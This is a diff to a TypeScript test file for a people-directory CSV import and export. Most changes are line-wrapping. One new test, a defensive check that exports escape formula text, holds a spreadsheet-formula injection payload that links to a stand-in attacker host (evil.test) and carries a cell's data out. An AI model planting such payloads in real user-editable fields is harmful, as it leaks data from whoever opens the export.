@@ -3,7 +3,8 @@ import { PROFILE_PROVIDER_IDS } from "../people/identities";
 import { LEGACY_NAME_NOTICE, PEOPLE_CSV_HEADERS, parsePeopleCsv, peopleToCsv } from "./people";
 
 // Most cases use the older single `name` column, which still imports (split at the last space).
-const HEADER = "email,name,preferred_name,title,home_region,home_timezone,phone,start_date,active,manager_email,desk,teams,primary_team";
+const HEADER =
+  "email,name,preferred_name,title,home_region,home_timezone,phone,start_date,active,manager_email,desk,teams,primary_team";
 
 describe("parsePeopleCsv", () => {
   it("parses a full row into a person record", () => {
@@ -34,7 +35,8 @@ describe("parsePeopleCsv", () => {
   });
 
   it("reads given_name and family_name", () => {
-    const csv = "email,given_name,family_name,home_region\nm@x.com,Mary Ann,Smith,US\np@x.com,Priya,,IN\n";
+    const csv =
+      "email,given_name,family_name,home_region\nm@x.com,Mary Ann,Smith,US\np@x.com,Priya,,IN\n";
     const { rows, notices } = parsePeopleCsv(csv);
     expect(rows.map((r) => [r.record.givenName, r.record.familyName])).toEqual([
       ["Mary Ann", "Smith"],
@@ -50,13 +52,17 @@ describe("parsePeopleCsv", () => {
   });
 
   it("prefers given_name when a file has both", () => {
-    const { rows, notices } = parsePeopleCsv("email,name,given_name,home_region\nm@x.com,Ignored Name,Mary,US\n");
+    const { rows, notices } = parsePeopleCsv(
+      "email,name,given_name,home_region\nm@x.com,Ignored Name,Mary,US\n",
+    );
     expect(rows[0]?.record).toMatchObject({ givenName: "Mary", familyName: null });
     expect(notices).toEqual([]);
   });
 
   it("needs a given name or a name column", () => {
-    expect(parsePeopleCsv("email,home_region\na@x.com,US\n").fatal).toBe("Missing required column(s): given_name");
+    expect(parsePeopleCsv("email,home_region\na@x.com,US\n").fatal).toBe(
+      "Missing required column(s): given_name",
+    );
     expect(parsePeopleCsv("email,given_name,home_region\na@x.com,,US\n").issues[0]?.message).toBe(
       "given_name is required",
     );
@@ -135,7 +141,9 @@ describe("home_timezone", () => {
     const csv = `${HEADER}\na@x.com,A,,,US,america/new_york,,,,,,,\nb@x.com,B,,,US,Mars/Olympus,,,,,,,\n`;
     const { rows, issues } = parsePeopleCsv(csv);
     expect(rows[0]?.record.homeTimezone).toBe("America/New_York");
-    expect(issues).toEqual([{ line: 3, message: expect.stringMatching(/^home_timezone is not an IANA time zone/) }]);
+    expect(issues).toEqual([
+      { line: 3, message: expect.stringMatching(/^home_timezone is not an IANA time zone/) },
+    ]);
   });
 });
 
@@ -185,6 +193,39 @@ describe("peopleToCsv", () => {
     const csv = peopleToCsv(original);
     expect(csv.split("\n")[0]).toBe(PEOPLE_CSV_HEADERS.join(","));
     expect(csv.split("\n")[0]).toMatch(/^email,given_name,family_name,preferred_name,/);
+    const { rows, issues } = parsePeopleCsv(csv);
+    expect(issues).toEqual([]);
+    expect(rows.map((r) => r.record)).toEqual(original);
+  });
+
+  it("writes self-edited formula text as text, and reads it back unchanged", () => {
+    // Viewers set their own preferred name on My profile, and admins open this export.
+    const payload = '=HYPERLINK("https://evil.test/?d="&A2,"Open")';
+    const original = [
+      {
+        email: "eve@x.com",
+        givenName: "Eve",
+        familyName: null,
+        preferredName: payload,
+        title: null,
+        phone: "+14155550100",
+        homeRegion: "US-CA",
+        homeTimezone: null,
+        startDate: null,
+        endDate: null,
+        active: true,
+        managerEmails: [],
+        deskCode: null,
+        officeSlug: null,
+        teamSlugs: [],
+        primaryTeamSlug: null,
+        identities: {},
+      },
+    ];
+    const csv = peopleToCsv(original);
+    const row = csv.split("\n")[1]!;
+    expect(row).toContain(`"'=HYPERLINK(`);
+    expect(row).toContain(",+14155550100,");
     const { rows, issues } = parsePeopleCsv(csv);
     expect(issues).toEqual([]);
     expect(rows.map((r) => r.record)).toEqual(original);
